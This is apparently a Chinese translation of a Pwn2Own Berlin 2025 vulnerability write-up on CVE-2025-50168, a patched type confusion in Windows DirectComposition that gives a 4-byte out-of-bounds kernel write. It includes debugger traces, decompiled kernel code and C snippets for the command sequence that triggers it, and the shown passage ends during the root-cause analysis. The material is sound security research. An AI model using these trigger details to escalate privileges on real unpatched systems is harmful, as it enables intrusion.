---
title: 四字节的谎言：无 SMAP 保护下的内核指针信任欺骗
url: https://mp.weixin.qq.com/s/Po_J2e7y_ZzMWA2B_URRQA
source: Doonsec's feed
date: 2026-01-08
fetch_date: 2026-01-09T03:27:27.046414
---

# 四字节的谎言：无 SMAP 保护下的内核指针信任欺骗

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/hoiaQy7WhTCMlkPCfy1glEeQMSzgaIfAZLk39NpyicGVdZ4mhHyCCZhmMSWG9cgyLUeF9d6mv7K982MSXFVPEq8g/0?wx_fmt=jpeg)

# 四字节的谎言：无 SMAP 保护下的内核指针信任欺骗

Hyeonjin

securitainment

![]()

在小说阅读器中沉浸阅读

## 引言

本文记录了我作为 **Pwn2Own Berlin 2025**首次参赛提交的漏洞 (注：该问题已在 2025 年 8 月的补丁星期二中修复，编号为 **CVE-2025-50168**)。这不仅仅是一份常规的漏洞报告，更是一个案例研究，展示了一小块看似微不足道的数据如何破坏操作系统的信任假设并实现权限提升。我将解释该漏洞的核心机制、使利用成为可能的设计和环境因素，特别关注目标 Windows 配置上缺乏 SMAP 强制执行的情况。最后，我将描述如何改编现有技术以产生新颖的利用原语。

## 背景

DirectComposition 是一项 Windows 技术，旨在通过利用 GPU 加速实现高性能 UI 渲染。该功能有助于流畅实现视觉效果，如动画、透明度和变换，这些对现代图形用户界面至关重要。

DirectComposition 的实现由两个主要组件组成：

* 用户模式组件：一个名为 **dwm.exe (Desktop Window Manager)**的进程，负责管理合成任务。
* 内核模式组件：**DirectComposition**类，在 win32kbase.sys 中实现，提供底层合成基础设施。

dwm.exe 进程以 SYSTEM IL 运行，授予其管理高权限合成任务所需的权限。

当 GUI 应用程序打算使用 DirectComposition 应用视觉效果时，它与 win32kbase.sys 中实现的 DirectComposition 组件交互。应用程序通过该组件执行创建资源和设置属性等操作。

随后，内核编组这些操作的结果并将其转发到 dwm.exe 进程，后者将请求的更改应用到桌面合成。

要执行这些操作，应用程序必须：

1. 创建一个通道以传达合成命令。
2. 生成渲染所需的资源。
3. 将合成和效果应用于资源。
4. 提交到 dwm.exe 以应用累积的更改。

然后通过调用 Native APIs 将这些更改提交到 dwm.exe，这将在以下部分中描述。

`NtDCompositionCreateChannel`函数是一个 Native API，用于在用户模式应用程序和内核中的 DirectComposition 子系统之间创建合成通道。

```
typedefNTSTATUS(*pNtDCompositionCreateChannel)(
    OUT PHANDLE hChannel,
    IN OUT PSIZE_T pSectionSize,
    OUT PVOID* pMappedAddress
    );
```

* `hChannel`

  :接收新创建的 DirectComposition 通道的句柄。
* `pSectionSize`

  :输入/输出参数，指定共享命令缓冲区的大小。
* `pMappedAddress`

  :接收指向用于写入合成命令的内存映射缓冲区的指针。

`NtDCompositionProcessChannelBuffer`函数是一个 Native API，用于处理已写入共享命令缓冲区的一批合成命令。

```
typedefNTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwBufferSize,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2
);
```

* `hChannel`

  :由 `NtDCompositionCreateChannel`先前创建的合成通道的句柄
* `dwBufferSize`

  :一个输入值，指定批次的起始位置或命令流中的偏移量。
* `pOutArg1`

  , `pOutArg2`:输出参数，在处理批次后接收内部状态或结果代码。

`NtDCompositionCommitChannel`函数是一个 Native API，用于提交在通道上写入的合成命令，表明该批次已准备好供合成器执行。

```
typedefNTSTATUS(*pNtDCompositionCommitChannel)(
    IN HANDLE hChannel,
    OUT PDWORD pOut1,
    OUT PDWORD pOut2,
    IN DWORD flag,
    IN HANDLE Object
);
```

* `hChannel`

  :用于通信的合成通道的句柄。
* `pOut1`

  , `pOut2`:输出参数，可能从提交操作返回内部状态或结果值。
* `flag`

  :控制提交行为的输入标志 (例如 flush、sync 等)
* `Object`

  :可选的同步对象句柄，例如事件，用于协调提交操作。

## 漏洞

```
2: kd> r
rax=fffff800288e9848 rbx=0000000000000005 rcx=0000000000000039
rdx=000000000000005c rsi=ffffb602e61e7a00 rdi=0000000000000000
rip=fffff800287888c7 rsp=fffff908f33c7870 rbp=000000000000002b
r8=fffff80028660000 r9=fffff908f33c7904 r10=ffffb602e61e7a00
r11=0000000000000000 r12=000000000000000c r13=fffff80028660000
r14=ffffb602e670c010 r15=ffffd40fd5870010
iopl=0 nv up ei pl nz na pe cy
cs=0010 ss=0018 ds=002b es=002b fs=0053 gs=002b
efl=00040203
win32kbase!DirectComposition::CResourceMarshaler::SetFloatProperty+0x27:
fffff800`287888c7 f3420f111412 movss dword ptr [rdx+r10],xmm2
ds:002b:ffffb602`e61e7a5c=00000000
2: kd> !pool @r10
Pool page ffffb602e61e7a00 region is Paged pool
ffffb602e61e7040 size: 50 previous size: 0 (Free) SeAt
ffffb602e61e7090 size: 50 previous size: 0 (Allocated) SeAt
[…]
*ffffb602e61e79f0 size: 50 previous size: 0 (Allocated) *DCs0 Process:
ffffe588bce760c0
Pooltag DCs0 : DCOMPOSITIONTAG_SHAREDRESOURCEMARSHALER,
Binary : win32kbase!DirectComposition::C
ffffb602e61e7a40 size: 50 previous size: 0 (Allocated) Gapl
ffffb602e61e7a90 size: 50 previous size: 0 (Allocated) Gapl
[…]
2: kd> dq @r10
ffffb602`e61e7a00 fffff800`288c58e0 00000000`00000000
ffffb602`e61e7a10 00000000`00000000 00000000`00000001
ffffb602`e61e7a20 00000013`00000001 00000000`00000000
ffffb602`e61e7a30 00000000`00000000 ffffe588`bc824978
ffffb602`e61e7a40 6c706147`03050000 00000000`00000000 <- Next chunk
ffffb602`e61e7a50 0000ff00`00ff0000 00000000`000000ff
ffffb602`e61e7a60 00000010`00000008 00000008`00000010
ffffb602`e61e7a70 00000008`00000000 00000008`00000008
2: kd> p
win32kbase!DirectComposition::CResourceMarshaler::SetFloatProperty+0x2d:
fffff800`287888cd 8b4810 mov ecx,dword ptr [rax+10h]
2: kd> dq @r10
ffffb602`e61e7a00 fffff800`288c58e0 00000000`00000000
ffffb602`e61e7a10 00000000`00000000 00000000`00000001
ffffb602`e61e7a20 00000013`00000001 00000000`00000000
ffffb602`e61e7a30 00000000`00000000 ffffe588`bc824978
ffffb602`e61e7a40 6c706147`03050000 00000000`00000000 <- Next chunk
ffffb602`e61e7a50 0000ff00`00ff0000 41414141`000000ff <- overwriten 4 bytes of 0xC
ffffb602`e61e7a60 00000010`00000008 00000008`00000010
ffffb602`e61e7a70 00000008`00000000 00000008`00000008
```

该漏洞看起来是一个 ***越界写入***,但受到特定约束。虽然攻击者无法控制索引，但该漏洞允许在同一 Low Fragmentation Heap (LFH) 桶内的下一个堆块中以固定偏移量 (+0xC) 写入 4 个任意字节。

易受攻击的对象驻留在从 *Paged Pool*分配的 0x50 字节 LFH 块中 (包括 `POOL_HEADER`),写入原语允许修改同一桶内确定位置的相邻块。

上面的调试器快照显示了损坏的块内容和四个字节落地的确定性偏移量，这表明这是逻辑级别的不匹配而不是原始内存溢出。

那么为什么会发生这种越界写入呢？在下一节中，我们将追踪根本原因并了解类型不匹配如何导致跨越单个 LFH 桶内池边界的写入原语。

### 根因分析

此漏洞源于 DirectComposition 组件内的资源管理不当和类型混淆。

在以下部分中，将重点关注这些资源的处理方式来解释漏洞的根本原因。

为了提供对漏洞的高级和直观的理解，以下是可用于触发该问题的 DirectComposition 命令序列示例：

1. 创建 External Shared Resource
2. 获取 External Shared Resource 句柄
3. 释放 External Shared Resource
4. 重新打开 External Shared Resource
5. 在资源上设置浮点属性

从上述命令序列可以看出——即使在初步阶段——该漏洞与对象的生命周期密切相关。

实际上，该问题最终源于资源管理不当，导致 ***类型混淆***条件，最终导致 ***越界写入***。

这凸显了 DirectComposition 在释放和重新打开共享资源对象后如何处理其重用方面的关键缺陷。

#### 首先，创建 External Shared Resource

```
((CREATE_RESOURCE*)CmdBuf)->CmdId = CreateResource;
((CREATE_RESOURCE*)CmdBuf)->ResourceId = 0x1;
((CREATE_RESOURCE*)CmdBuf)->ResourceType = 0x13;
((CREATE_RESOURCE*)CmdBuf)->IsSharedResource = 1;
size = sizeof(CREATE_RESOURCE);
status = NtDCompositionProcessChannelBatchBuffer(g_hChannel, size, &dwOutArg1, &dwOutArg2);
```

这里重要的一点是 `ResourceType`设置为 **0x13**,`IsSharedResource`标志 **已启用**。**0x13**类型代表 `CCaptureControllerMarshaler`。

```
__int64 __fastcall DirectComposition::CApplicationChannel::ProcessCommandBufferIterator(
unsigned __int64 this,
constunsigned __int64 *a2,
unsignedint a3,
char a4,
unsignedint *a5)
{
[…]
case2u:                                // CreateResource
this = (unsigned __int64)CmdBuf;
if ( v6 < 0x10 )
goto LABEL_38;
          ResourceType = *((_DWORD *)CmdBuf + 2);
          v164 = ResourceType;
if ( ResourceType - 1 > 0xBE )
goto LABEL_38;
          v157 = CmdBuf + 2;
          v153 = v6 - 16;
if ( *((_DWORD *)CmdBuf + 3) )        // isSharedResource
          {
            result = DirectComposition::CApplicationChannel::CreateExternalSharedResource(
                       ChannelObj,
                       *((_DWORD *)CmdBuf + 1), // ResourceId
                       ResourceType);
break;
          }
          v12 = *((unsignedint *)CmdBuf + 1);
          v166 = 0LL;
          v168[0] = 0LL;
          result = DirectComposition::CApplicationChannel::CreatePrivateMarshaler(ChannelObj_1, ResourceType, v168);
if ( result < 0 )
break;
[…]
```

`CreateResource`命令根据 `IsSharedResource`标志是否 **已启用**,调用 `DirectComposition::CApplicationChannel::CreateExternalSharedResource`来创建共享资源。

```
__int64 __fastcall DirectComposition::CApplicationChannel::CreateExternalSharedResource(
        DirectComposition::CApplicationChannel *this,
unsignedint a2,
unsignedint a3)
{
  __int64 result; // rax
structDirectComposition::CResourceMarshaler *v7; // [rsp+30h] [rbp-28h] BYREF
structDirectComposition::ResourceObject *v8; // [rsp+78h] [rbp+20h] BYREF

  v8 = 0LL;
  v7 = 0LL;
if ( a3 != 182 && (unsigned __int8)DirectComposition::CResourceMarshaler::IsDerivedResourceType(a3) )
return3221225485LL;
  result = CreateSharedResourceObject((void *)a3, &v8);
if ( (int)result >= 0 )
  {
_InterlockedCompareExchange((volatilesigned __int32 *)v8 + 15, 1, 0);
    result = DirectComposition::CApplicationChannel::OpenInternalSharedWriteResource(this, a3, v8, &v7);
if ( (int)result >= 0 )
returnDirectComposition::CApplicationChannel::RegisterExternalResource(this, v7, a2, a3, 1);
  }
return result;
}
```

在 `DirectComposition::CApplicationChannel::CreateExternalSharedResource`中，首先检查传入的 `ResourceType`,并调用 `CreateSharedResourceObject`创建 Share...